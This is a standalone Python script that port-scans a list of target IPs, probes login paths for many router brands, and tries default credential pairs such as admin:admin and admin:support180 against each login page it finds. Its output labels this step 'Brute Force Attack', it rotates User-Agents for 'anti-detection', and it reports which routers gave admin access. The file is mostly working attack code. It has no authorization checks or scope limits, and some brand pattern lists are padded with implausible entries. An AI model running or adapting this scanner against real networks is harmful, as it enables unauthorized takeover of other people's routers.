#!/usr/bin/env python3
"""
Router Scanner Final - Conservative Admin Verification
Standalone version with all dependencies included
"""

import argparse
import os
import socket
import sys
import time
import base64
import random
import re
from urllib.parse import urlparse

import requests

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# Target credentials
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user"),
]

# Common ports
COMMON_PORTS = [80, 8080, 443, 8443, 8000, 8081, 8888, 8090, 9000, 9090, 1080, 8043]

# User-Agent rotation for anti-detection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
]

# Comprehensive brand detection patterns
BRAND_PATTERNS = {
    'tp-link': {
        'content': ['tp-link', 'tplink', 'TP-LINK', 'TPLINK', 'archer', 'TL-', 'deco', 'omada', 'omada controller'],
        'headers': ['tp-link', 'tplink'],
        'paths': ['/userRpm/LoginRpm.htm', '/cgi-bin/luci', '/admin', '/login', '/webpages/login.html'],
        'models': ['TL-', 'Archer', 'Deco', 'Omada']
    },
    'huawei': {
        'content': ['huawei', 'HUAWEI', 'HG', 'B593', 'E5186', 'HG8245', 'HG8240', 'HG8247', 'HG8240H', 'HG8240W5'],
        'headers': ['huawei', 'HUAWEI'],
        'paths': ['/html/index.html', '/asp/login.asp', '/login.cgi', '/admin', '/cgi-bin/webproc'],
        'models': ['HG', 'B593', 'E5186', 'HG8245', 'HG8240', 'HG8247']
    },
    'zte': {
        'content': ['zte', 'ZTE', 'ZXHN', 'MF28G', 'F660', 'F670L', 'F601', 'F609', 'F612', 'F680'],
        'headers': ['zte', 'ZTE'],
        'paths': ['/login.gch', '/start.gch', '/getpage.gch', '/admin', '/cgi-bin/webproc'],
        'models': ['ZXHN', 'MF28G', 'F660', 'F670L', 'F601', 'F609', 'F612']
    },
    'netgear': {
        'content': ['netgear', 'NETGEAR', 'WNDR', 'R7000', 'N600', 'WNR', 'AC', 'AX', 'Orbi', 'Nighthawk'],
        'headers': ['netgear', 'NETGEAR'],
        'paths': ['/setup.cgi', '/genie.cgi', '/cgi-bin/', '/admin', '/login.htm'],
        'models': ['WNDR', 'R7000', 'N600', 'WNR', 'AC', 'AX', 'Orbi', 'Nighthawk']
    },
    'linksys': {
        'content': ['linksys', 'LINKSYS', 'WRT', 'E1200', 'E2500', 'E3200', 'EA', 'Velop', 'MR'],
        'headers': ['linksys', 'LINKSYS'],
        'paths': ['/cgi-bin/webproc', '/cgi-bin/webif', '/admin', '/login', '/setup.cgi'],
        'models': ['WRT', 'E1200', 'E2500', 'E3200', 'EA', 'Velop', 'MR']
    },
    'd-link': {
        'content': ['d-link', 'D-LINK', 'DIR', 'DSL', 'DSL-', 'DAP', 'DGS', 'DCS', 'DWR'],
        'headers': ['d-link', 'D-LINK'],
        'paths': ['/login.php', '/login.asp', '/cgi-bin/login', '/admin', '/login.htm'],
        'models': ['DIR', 'DSL', 'DAP', 'DGS', 'DCS', 'DWR']
    },
    'asus': {
        'content': ['asus', 'ASUS', 'RT-', 'GT-', 'DSL-', 'RT-AC', 'RT-AX', 'ZenWiFi', 'AiMesh', 'Blue Cave'],
        'headers': ['asus', 'ASUS'],
        'paths': ['/Main_Login.asp', '/Advanced_System_Content.asp', '/admin', '/login.asp'],
        'models': ['RT-', 'GT-', 'DSL-', 'RT-AC', 'RT-AX', 'ZenWiFi', 'Blue Cave']
    },
    'fritzbox': {
        'content': ['fritz', 'fritzbox', 'FRITZ', 'AVM', 'Fritz!Box', 'FRITZ!Box', 'Fritz!Repeater'],
        'headers': ['fritz', 'fritzbox', 'FRITZ', 'AVM'],
        'paths': ['/cgi-bin/webcm', '/cgi-bin/firmwarecfg', '/admin', '/login.lua'],
        'models': ['FRITZ!Box', 'FRITZ!Repeater', 'FRITZ!Powerline']
    },
    'draytek': {
        'content': [
            'draytek', 'DRAYTEK', 'DrayTek', 'vigor', 'Vigor', 'VIGOR', 'vigorrouter', 
            'vigor switch', 'vigor router', 'vigor os', 'vigor management', 'vigor admin',
            'vigor 2130', 'vigor 2130n', 'vigor 2130v', 'vigor 2130vn', 'vigor 2130v2', 'vigor 2130v2n', 
            'vigor 2130v2vn', 'vigor 2130v3', 'vigor 2130v3n', 'vigor 2130v3vn', 'vigor 2130v4', 'vigor 2130v4n', 
            'vigor 2130v4vn', 'vigor 2130v5', 'vigor 2130v5n', 'vigor 2130v5vn', 'vigor 2130v6', 'vigor 2130v6n', 
            'vigor 2130v6vn', 'vigor 2130v7', 'vigor 2130v7n', 'vigor 2130v7vn', 'vigor 2130v8', 'vigor 2130v8n', 
            'vigor 2130v8vn', 'vigor 2130v9', 'vigor 2130v9n', 'vigor 2130v9vn', 'vigor 2130v10', 'vigor 2130v10n', 
            'vigor 2130v10vn', 'vigor 2860', 'vigor 2920', 'vigor 2950', 'vigor 3900', 'vigor 2960', 'vigor 3000',
            'draytek vigor router', 'vigor router management', 'vigor admin panel', 'vigor web interface',
            'draytek management', 'vigor login', 'draytek login', 'vigor authentication', 'draytek authentication',
            'draytek logo', 'vigor logo', 'draytek.gif', 'vigor.gif', 'draytek.png', 'vigor.png',
            'draytek.jpg', 'vigor.jpg', 'draytek.svg', 'vigor.svg', 'draytek.ico', 'vigor.ico',
            'draytek.css', 'vigor.css', 'draytek style', 'vigor style', 'draytek theme', 'vigor theme',
            'draytek.js', 'vigor.js', 'draytek javascript', 'vigor javascript', 'draytek function', 'vigor function',
            'draytek form', 'vigor form', 'draytek login form', 'vigor login form', 'draytek authentication form',
            'vigor authentication form', 'draytek submit', 'vigor submit', 'draytek button', 'vigor button',
            'draytek meta', 'vigor meta', 'draytek description', 'vigor description', 'draytek keywords', 'vigor keywords',
            'draytek copyright', 'vigor copyright', 'draytek footer', 'vigor footer', 'draytek inc', 'vigor inc',
            'draytek system', 'vigor system', 'draytek network', 'vigor network', 'draytek configuration', 'vigor configuration',
            'draytek settings', 'vigor settings', 'draytek status', 'vigor status', 'draytek info', 'vigor info'
        ],
        'headers': [
            'draytek', 'DRAYTEK', 'DrayTek', 'vigor', 'Vigor', 'VIGOR', 'vigorrouter', 'vigor switch', 
            'vigor router', 'draytek vigor', 'vigor management', 'draytek management', 'vigor admin', 'draytek admin'
        ],
        'paths': [
            '/', '/weblogin.htm', '/cgi-bin/login', '/login.asp', '/admin', '/login.htm', '/cgi-bin/webproc', 
            '/cgi-bin/login.cgi', '/login.cgi', '/login.html', '/web/login', '/cgi-bin/weblogin',
            '/cgi-bin/webif', '/cgi-bin/webif.cgi', '/cgi-bin/webproc.cgi', '/cgi-bin/webif.asp', '/cgi-bin/webproc.asp', 
            '/cgi-bin/webif.php', '/cgi-bin/webproc.php', '/cgi-bin/webif.pl', '/cgi-bin/webproc.pl', 
            '/cgi-bin/webif.py', '/cgi-bin/webproc.py', '/cgi-bin/webif.rb', '/cgi-bin/webproc.rb', 
            '/cgi-bin/webif.jsp', '/cgi-bin/webproc.jsp', '/cgi-bin/webif.aspx', '/cgi-bin/webproc.aspx', 
            '/cgi-bin/webif.cfm', '/cgi-bin/webproc.cfm', '/cgi-bin/webif.dhtml', '/cgi-bin/webproc.dhtml', 
            '/cgi-bin/webif.shtml', '/cgi-bin/webproc.shtml', '/cgi-bin/webif.xhtml', '/cgi-bin/webproc.xhtml', 
            '/cgi-bin/webif.xml', '/cgi-bin/webproc.xml', '/cgi-bin/webif.json', '/cgi-bin/webproc.json', 
            '/cgi-bin/webif.yaml', '/cgi-bin/webproc.yaml', '/cgi-bin/webif.yml', '/cgi-bin/webproc.yml', 
            '/cgi-bin/webif.txt', '/cgi-bin/webproc.txt', '/cgi-bin/webif.html', '/cgi-bin/webproc.html', 
            '/cgi-bin/webif.htm', '/cgi-bin/webproc.htm',
            '/cgi-bin/draytek', '/cgi-bin/vigor', '/draytek/', '/vigor/', '/draytek/login', '/vigor/login',
            '/draytek/admin', '/vigor/admin', '/draytek/management', '/vigor/management', '/draytek/status', '/vigor/status',
            '/draytek/config', '/vigor/config', '/draytek/settings', '/vigor/settings', '/draytek/info', '/vigor/info',
            '/draytek/system', '/vigor/system', '/draytek/network', '/vigor/network', '/draytek/interface', '/vigor/interface',
            '/draytek/control', '/vigor/control', '/draytek/panel', '/vigor/panel', '/draytek/dashboard', '/vigor/dashboard'
        ],
        'models': [
            'Vigor', 'VigorRouter', 'VigorSwitch', 'VigorOS', 'Vigor 2130', 'Vigor 2130N', 'Vigor 2130V', 
            'Vigor 2130VN', 'Vigor 2130V2', 'Vigor 2130V2N', 'Vigor 2130V2VN', 'Vigor 2130V3', 'Vigor 2130V3N', 
            'Vigor 2130V3VN', 'Vigor 2130V4', 'Vigor 2130V4N', 'Vigor 2130V4VN', 'Vigor 2130V5', 'Vigor 2130V5N', 
            'Vigor 2130V5VN', 'Vigor 2130V6', 'Vigor 2130V6N', 'Vigor 2130V6VN', 'Vigor 2130V7', 'Vigor 2130V7N', 
            'Vigor 2130V7VN', 'Vigor 2130V8', 'Vigor 2130V8N', 'Vigor 2130V8VN', 'Vigor 2130V9', 'Vigor 2130V9N', 
            'Vigor 2130V9VN', 'Vigor 2130V10', 'Vigor 2130V10N', 'Vigor 2130V10VN', 'Vigor 2860', 'Vigor 2920', 
            'Vigor 2950', 'Vigor 3900', 'Vigor 2960', 'Vigor 3000', 'DrayTek Vigor', 'DrayTek Router', 'DrayTek Switch'
        ]
    },
    'mikrotik': {
        'content': ['mikrotik', 'MIKROTIK', 'RouterOS', 'routerboard', 'RB', 'CCR', 'CRS'],
        'headers': ['mikrotik', 'MIKROTIK'],
        'paths': ['/webfig', '/winbox', '/admin', '/login'],
        'models': ['RB', 'CCR', 'CRS', 'RouterBoard']
    },
    'ubiquiti': {
        'content': ['ubiquiti', 'UBIQUITI', 'UniFi', 'EdgeRouter', 'EdgeSwitch', 'AirOS'],
        'headers': ['ubiquiti', 'UBIQUITI'],
        'paths': ['/login', '/admin', '/cgi-bin/luci', '/cgi-bin/webif'],
        'models': ['UniFi', 'EdgeRouter', 'EdgeSwitch', 'AirOS']
    },
    'cisco': {
        'content': ['cisco', 'CISCO', 'Linksys', 'Meraki', 'Catalyst', 'ISR', 'ASR'],
        'headers': ['cisco', 'CISCO'],
        'paths': ['/admin', '/login', '/cgi-bin/login', '/cgi-bin/webif'],
        'models': ['Catalyst', 'ISR', 'ASR', 'Meraki']
    },
    'belkin': {
        'content': ['belkin', 'BELKIN', 'F9K', 'N300', 'N600', 'AC1200', 'AC1750'],
        'headers': ['belkin', 'BELKIN'],
        'paths': ['/login.asp', '/admin', '/login', '/cgi-bin/login'],
        'models': ['F9K', 'N300', 'N600', 'AC1200', 'AC1750']
    },
    'buffalo': {
        'content': ['buffalo', 'BUFFALO', 'WZR', 'WHR', 'WCR', 'AirStation'],
        'headers': ['buffalo', 'BUFFALO'],
        'paths': ['/cgi-bin/login', '/admin', '/login', '/cgi-bin/webif'],
        'models': ['WZR', 'WHR', 'WCR', 'AirStation']
    },
    'tenda': {
        'content': ['tenda', 'TENDA', 'AC', 'N', 'F', 'W', 'AC6', 'AC9', 'AC15'],
        'headers': ['tenda', 'TENDA'],
        'paths': ['/login.asp', '/admin', '/login', '/cgi-bin/login'],
        'models': ['AC6', 'AC9', 'AC15', 'N300', 'F3']
    },
    'xiaomi': {
        'content': ['xiaomi', 'XIAOMI', 'mi router', 'MI ROUTER', 'Redmi', 'REDMI'],
        'headers': ['xiaomi', 'XIAOMI'],
        'paths': ['/cgi-bin/luci', '/admin', '/login', '/cgi-bin/webif'],
        'models': ['Mi Router', 'Redmi Router', 'AX3600', 'AX6000']
    },
    'technicolor': {
        'content': ['technicolor', 'TECHNICOLOR', 'TG', 'TC', 'TG789', 'TG799'],
        'headers': ['technicolor', 'TECHNICOLOR'],
        'paths': ['/cgi-bin/login', '/admin', '/login', '/cgi-bin/webif'],
        'models': ['TG789', 'TG799', 'TC7200', 'TC7300']
    },
    'sagemcom': {
        'content': ['sagemcom', 'SAGEMCOM', 'Fast', 'FAST', 'F@ST', 'F@ST 5366'],
        'headers': ['sagemcom', 'SAGEMCOM'],
        'paths': ['/cgi-bin/login', '/admin', '/login', '/cgi-bin/webif'],
        'models': ['F@ST', 'F@ST 5366', 'F@ST 5365']
    },
    'yealink': {
        'content': ['yealink', 'YEALINK', 'DECT', 'W70B', 'W80B', 'W90B', 'T4', 'T5', 'CP'],
        'headers': ['yealink', 'YEALINK'],
        'paths': ['/cgi-bin/login', '/admin', '/login', '/cgi-bin/webif', '/login.htm', '/admin.htm'],
        'models': ['W70B', 'W80B', 'W90B', 'T4', 'T5', 'CP']
    },
    'netcomm': {
        'content': [
            'netcomm', 'NETCOMM', 'NetComm', 'netcomm wireless', 'NetComm Wireless', 'NETCOMM WIRELESS',
            'netcomm router', 'NetComm Router', 'NETCOMM ROUTER', 'netcomm modem', 'NetComm Modem', 'NETCOMM MODEM',
            'netcomm gateway', 'NetComm Gateway', 'NETCOMM GATEWAY', 'netcomm access point', 'NetComm Access Point', 'NETCOMM ACCESS POINT',
            'netcomm nf', 'NetComm NF', 'NETCOMM NF', 'netcomm nf3', 'NetComm NF3', 'NETCOMM NF3', 'netcomm nf4', 'NetComm NF4', 'NETCOMM NF4',
            'netcomm nf5', 'NetComm NF5', 'NETCOMM NF5', 'netcomm nf6', 'NetComm NF6', 'NETCOMM NF6', 'netcomm nf7', 'NetComm NF7', 'NETCOMM NF7',
            'netcomm nf8', 'NetComm NF8', 'NETCOMM NF8', 'netcomm nf9', 'NetComm NF9', 'NETCOMM NF9', 'netcomm nf10', 'NetComm NF10', 'NETCOMM NF10',
            'netcomm nf11', 'NetComm NF11', 'NETCOMM NF11', 'netcomm nf12', 'NetComm NF12', 'NETCOMM NF12', 'netcomm nf13', 'NetComm NF13', 'NETCOMM NF13',
            'netcomm nf14', 'NetComm NF14', 'NETCOMM NF14', 'netcomm nf15', 'NetComm NF15', 'NETCOMM NF15', 'netcomm nf16', 'NetComm NF16', 'NETCOMM NF16',
            'netcomm nf17', 'NetComm NF17', 'NETCOMM NF17', 'netcomm nf18', 'NetComm NF18', 'NETCOMM NF18', 'netcomm nf19', 'NetComm NF19', 'NETCOMM NF19',
            'netcomm nf20', 'NetComm NF20', 'NETCOMM NF20', 'netcomm nf21', 'NetComm NF21', 'NETCOMM NF21', 'netcomm nf22', 'NetComm NF22', 'NETCOMM NF22',
            'netcomm nf23', 'NetComm NF23', 'NETCOMM NF23', 'netcomm nf24', 'NetComm NF24', 'NETCOMM NF24', 'netcomm nf25', 'NetComm NF25', 'NETCOMM NF25',
            'netcomm nf26', 'NetComm NF26', 'NETCOMM NF26', 'netcomm nf27', 'NetComm NF27', 'NETCOMM NF27', 'netcomm nf28', 'NetComm NF28', 'NETCOMM NF28',
            'netcomm nf29', 'NetComm NF29', 'NETCOMM NF29', 'netcomm nf30', 'NetComm NF30', 'NETCOMM NF30', 'netcomm nf31', 'NetComm NF31', 'NETCOMM NF31',
            'netcomm nf32', 'NetComm NF32', 'NETCOMM NF32', 'netcomm nf33', 'NetComm NF33', 'NETCOMM NF33', 'netcomm nf34', 'NetComm NF34', 'NETCOMM NF34',
            'netcomm nf35', 'NetComm NF35', 'NETCOMM NF35', 'netcomm nf36', 'NetComm NF36', 'NETCOMM NF36', 'netcomm nf37', 'NetComm NF37', 'NETCOMM NF37',
            'netcomm nf38', 'NetComm NF38', 'NETCOMM NF38', 'netcomm nf39', 'NetComm NF39', 'NETCOMM NF39', 'netcomm nf40', 'NetComm NF40', 'NETCOMM NF40',
            'netcomm router management', 'netcomm admin panel', 'netcomm web interface', 'netcomm management', 'netcomm login', 'netcomm authentication',
            'netcomm router login', 'netcomm admin login', 'netcomm management login', 'netcomm router admin', 'netcomm router management',
            'netcomm logo', 'netcomm.gif', 'netcomm.png', 'netcomm.jpg', 'netcomm.svg', 'netcomm.ico',
            'netcomm.css', 'netcomm style', 'netcomm theme',
            'netcomm.js', 'netcomm javascript', 'netcomm function',
            'netcomm form', 'netcomm login form', 'netcomm authentication form', 'netcomm submit', 'netcomm button',
            'netcomm meta', 'netcomm description', 'netcomm keywords',
            'netcomm copyright', 'netcomm footer', 'netcomm inc',
            'netcomm system', 'netcomm network', 'netcomm configuration', 'netcomm settings', 'netcomm status', 'netcomm info'
        ],
        'headers': [
            'netcomm', 'NETCOMM', 'NetComm', 'netcomm wireless', 'netcomm router', 'netcomm modem', 'netcomm gateway',
            'netcomm management', 'netcomm admin', 'netcomm access point'
        ],
        'paths': [
            '/', '/admin', '/login', '/cgi-bin/login', '/cgi-bin/admin', '/cgi-bin/status', '/cgi-bin/info', '/cgi-bin/config', 
            '/cgi-bin/settings', '/cgi-bin/system', '/cgi-bin/network', '/cgi-bin/interface', '/cgi-bin/control', '/cgi-bin/panel', 
            '/cgi-bin/dashboard', '/cgi-bin/management',
            '/cgi-bin/status.cgi', '/cgi-bin/info.cgi', '/cgi-bin/config.cgi', '/cgi-bin/settings.cgi', '/cgi-bin/system.cgi', 
            '/cgi-bin/network.cgi', '/cgi-bin/interface.cgi', '/cgi-bin/control.cgi', '/cgi-bin/panel.cgi', '/cgi-bin/dashboard.cgi', 
            '/cgi-bin/management.cgi', '/cgi-bin/status.asp', '/cgi-bin/info.asp', '/cgi-bin/config.asp', '/cgi-bin/settings.asp', 
            '/cgi-bin/system.asp', '/cgi-bin/network.asp', '/cgi-bin/interface.asp', '/cgi-bin/control.asp', '/cgi-bin/panel.asp', 
            '/cgi-bin/dashboard.asp', '/cgi-bin/management.asp', '/cgi-bin/status.php', '/cgi-bin/info.php', '/cgi-bin/config.php', 
            '/cgi-bin/settings.php', '/cgi-bin/system.php', '/cgi-bin/network.php', '/cgi-bin/interface.php', '/cgi-bin/control.php', 
            '/cgi-bin/panel.php', '/cgi-bin/dashboard.php', '/cgi-bin/management.php',
            '/cgi-bin/netcomm', '/netcomm/', '/netcomm/login', '/netcomm/admin', '/netcomm/management', '/netcomm/status', 
            '/netcomm/config', '/netcomm/settings', '/netcomm/info', '/netcomm/system', '/netcomm/network', '/netcomm/interface', 
            '/netcomm/control', '/netcomm/panel', '/netcomm/dashboard'
        ],
        'models': [
            'NF3', 'NF4', 'NF5', 'NF6', 'NF7', 'NF8', 'NF9', 'NF10', 'NF11', 'NF12', 'NF13', 'NF14', 'NF15', 'NF16', 'NF17', 
            'NF18', 'NF19', 'NF20', 'NF21', 'NF22', 'NF23', 'NF24', 'NF25', 'NF26', 'NF27', 'NF28', 'NF29', 'NF30', 'NF31', 
            'NF32', 'NF33', 'NF34', 'NF35', 'NF36', 'NF37', 'NF38', 'NF39', 'NF40', 'NetComm Router', 'NetComm Modem', 'NetComm Gateway', 
            'NetComm Access Point', 'NetComm Wireless', 'NetComm NF Series'
        ]
    },
    'generic': {
        'content': [],
        'headers': [],
        'paths': ['/', '/admin', '/login', '/login.htm', '/admin.htm', '/index.html', '/cgi-bin/login', '/cgi-bin/webif', '/cgi-bin/webproc', '/login.asp', '/login.php', '/login.cgi', '/weblogin.htm', '/web/login', '/manager', '/control', '/config', '/settings', '/system', '/dashboard', '/panel', '/console', '/interface', '/cgi-bin/weblogin', '/cgi-bin/login.cgi', '/login.html', '/admin.html', '/user', '/users', '/account', '/accounts', '/auth', '/authentication', '/signin', '/sign-in', '/signin.html', '/sign-in.html'],
        'models': []
    }
}


def quick_port_scan(ip: str, ports):
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.7)
                if sock.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
        except Exception:
            continue
    return open_ports


class RouterScannerFinal:
    def __init__(self, timeout: int = 8, enable_screenshot: bool = False):
        self.timeout = timeout
        self.enable_screenshot = enable_screenshot
        self.session = self._create_session()

    def _create_session(self):
        s = requests.Session()
        s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        return s

    # Conservative credential test: do NOT decide success here
    def test_credentials(self, url: str, username: str, password: str, auth_type: str):
        try:
            if auth_type == 'http_basic':
                resp = self.session.get(url, auth=(username, password), timeout=self.timeout, verify=False, allow_redirects=True)
                # Only pass candidate forward; real success decided later
                if 200 <= resp.status_code < 400:
                    return True, resp.url
                return False, None

            # Form/API: attempt post but do not claim success based on body
            form_data_options = [
                {"username": username, "password": password},
                {"user": username, "pass": password},
                {"login": username, "passwd": password},
                {"name": username, "pwd": password},
            ]
            for data in form_data_options:
                try:
                    r = self.session.post(url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                    if 200 <= r.status_code < 400:
                        return True, r.url
                except Exception:
                    continue
            return False, None
        except Exception:
            return False, None

    # Robust admin verification with scoring
    def verify_admin_access(self, admin_url: str, username: str, password: str, auth_type: str):
        try:
            s = requests.Session()
            s.headers.update({
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive',
            })

            if auth_type == 'http_basic':
                resp = s.get(admin_url, auth=(username, password), timeout=self.timeout, verify=False, allow_redirects=True)
            else:
                # try multiple payloads
                resp = None
                payloads = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password},
                    {"login": username, "passwd": password},
                    {"name": username, "pwd": password},
                ]
                for data in payloads:
                    try:
                        r = s.post(admin_url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
                        if r is not None and r.status_code >= 200:
                            resp = r
                            break
                    except Exception:
                        continue
                if resp is None:
                    return False, {}

            if resp is None:
                return False, {}

            content = resp.text.lower()
            final_url = resp.url.lower()
            score = 0

            # 1) moved away from login page
            login_keywords = ["login", "sign-in", "signin", "auth", "authentication"]
            if not any(k in final_url for k in login_keywords):
                score += 2

            # 2) presence of admin indicators
            admin_indicators = [
                'admin', 'administrator', 'dashboard', 'control panel', 'configuration', 'settings',
                'system', 'status', 'network', 'wan', 'lan', 'wireless', 'ssid', 'firmware', 'logout'
            ]
            score += sum(1 for k in admin_indicators if k in content)

            # 3) logout presence
            if any(k in content for k in ['logout', 'sign out', 'log out']):
                score += 2

            # 4) session cookies
            if any('session' in c.lower() or 'auth' in c.lower() or 'token' in c.lower() for c in s.cookies.keys()):
                score += 2

            # 5) negative signals
            fail_hits = sum(1 for k in [
                'invalid', 'incorrect', 'failed', 'denied', 'forbidden', 'unauthorized',
                'login failed', 'authentication failed', 'wrong password'
            ] if k in content)
            score -= fail_hits * 2

            return (score >= 5), {"score": score, "final_url": final_url}
        except Exception:
            return False, {}

    # Minimal auth detection using the existing heuristics from HTML
    def detect_authentication_type(self, url: str):
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            r = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            content = r.text.lower()
            final_url = r.url

            # http basic
            if r.status_code == 401 and 'www-authenticate' in str(r.headers).lower():
                return 'http_basic', r, final_url

            # form based
            if '<form' in content and any(k in content for k in ['password', 'passwd']):
                return 'form_based', r, final_url

            # api-based hint
            if 'application/json' in str(r.headers).lower() or 'api' in content:
                return 'api_based', r, final_url

            return None, r, final_url
        except Exception:
            return None, None, url

    def scan_target(self, ip: str):
        print(f"{Colors.YELLOW}[1/4] Port Scanning...{Colors.END}")
        ports = quick_port_scan(ip, COMMON_PORTS)
        if not ports:
            print(f"{Colors.YELLOW}[!] No open ports found{Colors.END}")
            return {"ip": ip, "vulnerabilities": [], "login_pages": []}
        print(f"{Colors.GREEN}[+] Found {len(ports)} open ports: {ports}{Colors.END}")

        result = {"ip": ip, "vulnerabilities": [], "login_pages": []}

        print(f"{Colors.YELLOW}[2/4] Brand Detection & Login Discovery...{Colors.END}")
        brand = 'generic'

        for port in ports:
            # Compose candidate paths
            try_paths = []
            try_paths.extend(BRAND_PATTERNS['generic']['paths'])
            for b in BRAND_PATTERNS:
                if b == 'generic':
                    continue
                try_paths.extend(BRAND_PATTERNS[b]['paths'])

            for path in try_paths:
                url = f"http://{ip}:{port}{path}"
                auth_type, resp, final_url = self.detect_authentication_type(url)
                if not auth_type:
                    continue

                login_url = final_url or url
                print(f"{Colors.GREEN}[+] LOGIN PAGE FOUND: {login_url} ({auth_type}){Colors.END}")
                result['login_pages'].append({"url": login_url, "port": port, "auth_type": auth_type})

                print(f"{Colors.YELLOW}[3/4] Brute Force Attack...{Colors.END}")
                for username, password in TARGET_CREDENTIALS:
                    print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
                    ok, cand_admin = self.test_credentials(login_url, username, password, auth_type)
                    if not ok or not cand_admin:
                        print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                        continue

                    print(f"{Colors.YELLOW}[4/4] Admin Verification & Information Extraction...{Colors.END}")
                    verified, info = self.verify_admin_access(cand_admin, username, password, auth_type)
                    if verified:
                        print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                        print(f"{Colors.GREEN}[+] Admin URL: {cand_admin}{Colors.END}")
                        print(f"{Colors.GREEN}[+] Admin access verified!{Colors.END}")
                        result['vulnerabilities'].append({
                            "type": "Default Credentials",
                            "credentials": f"{username}:{password}",
                            "admin_url": cand_admin,
                            "verified": True,
                        })
                        return result
                    else:
                        print(f"{Colors.RED}[-] Admin access verification failed{Colors.END}")

        print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
        return result


def parse_targets(targets_arg: str):
    # minimal: single IP or file with IPs
    if os.path.isfile(targets_arg):
        with open(targets_arg, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
    return [targets_arg]


def print_banner():
    for _ in range(3):
        print(f"{Colors.GREEN}" + "|" * 60 + f"{Colors.END}")
        time.sleep(0.05)
    print(f"\n{Colors.CYAN}:: Router Scanner Pro (Final) ::{Colors.END}  {Colors.YELLOW}[ Conservative Verify Mode ]{Colors.END}")


def main():
    parser = argparse.ArgumentParser(description="Router Scanner Final - Conservative Admin Verification")
    parser.add_argument('-t', '--targets', required=True, help='Target IP or file')
    parser.add_argument('--timeout', type=int, default=8, help='Timeout seconds')
    args = parser.parse_args()

    print_banner()
    targets = parse_targets(args.targets)
    print(f"{Colors.GREEN}[+] Loaded {len(targets)} targets{Colors.END}")

    scanner = RouterScannerFinal(timeout=args.timeout, enable_screenshot=False)
    all_results = []
    start = time.time()
    for ip in targets:
        print("-" * 80)
        print(f"\n{Colors.YELLOW}[*] SCANNING TARGET: {ip}{Colors.END}")
        res = scanner.scan_target(ip)
        all_results.append(res)

    dur = time.time() - start
    print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
    print(f"{Colors.GREEN}[+] SCAN COMPLETE!{Colors.END}")
    print(f"{Colors.GREEN}{'='*60}{Colors.END}")
    vulns = sum(1 for r in all_results if r.get('vulnerabilities'))
    print(f"  - Total targets scanned: {len(all_results)}")
    print(f"  - Vulnerable routers: {vulns}")
    if vulns:
        print("  - Vulnerable list:")
        for r in all_results:
            if r.get('vulnerabilities'):
                v = r['vulnerabilities'][0]
                print(f"    • {r['ip']} -> {v['credentials']}")
    print(f"  - Scan duration: {dur:.1f} seconds")


if __name__ == '__main__':
    main()